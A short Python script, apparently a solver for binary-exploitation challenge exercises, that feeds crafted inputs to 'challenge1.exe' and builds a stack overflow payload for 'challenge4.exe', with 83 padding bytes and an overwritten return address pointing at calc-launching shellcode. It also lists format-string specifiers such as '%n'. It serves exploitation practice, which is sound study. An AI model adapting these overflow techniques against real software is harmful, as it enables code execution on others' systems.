import subprocess
import struct

# does not do vulnerability discovery and automating
def main():
    while True:
        print('Choose a PE binary:')
        print('0. exit')
        print('1. challenge 1')
        print('4. challenge 4')
        print('7. modern 2 (not implemented)')
        print('8. modern 3 (not implemented)')
    
        choice = input()
        if choice == '0':
            print('exiting')
            break
        elif choice == '1':
            challenge1()
        elif choice == '4':
            challenge4()
        # elif choice == '7':
        #     modern2()
        # elif choice == '8':
        #     modern3()

def challenge1():
    p = subprocess.Popen('challenge1.exe', stdin=subprocess.PIPE, stdout=subprocess.PIPE)

    p.stdin.write(b'-1\n')
    p.stdin.flush()

    p.stdin.write(('20405389691097'+'\n').encode())
    p.stdin.flush()

    p.stdin.close()
    print(p.stdout.read().decode())
    p.kill()

def challenge4():
    binary = 'challenge4.exe'
    arg1 = 'challenge4a.exe'
    proc = subprocess.Popen([binary, arg1], stdin=subprocess.PIPE)

    # offset to shellcode in .rdata section
    offset = 0x2490 # pops calc.exe https://www.exploit-db.com/shellcodes/48116

    base_offset = int(input(), 16) + offset
    shellcode_addr = struct.pack('<I', base_offset) # convert to little endian

    buf = b'\x00' # start with a null byte because of the bogus strcpy
    buf += b'\x41' * 83
    buf += shellcode_addr

    proc.communicate(input=buf)

fs_specifiers = [
    '%s', '%S',
    '%x', '%X',
    '%n', '%N',
    '%p',
]

if __name__ == '__main__':
    main()
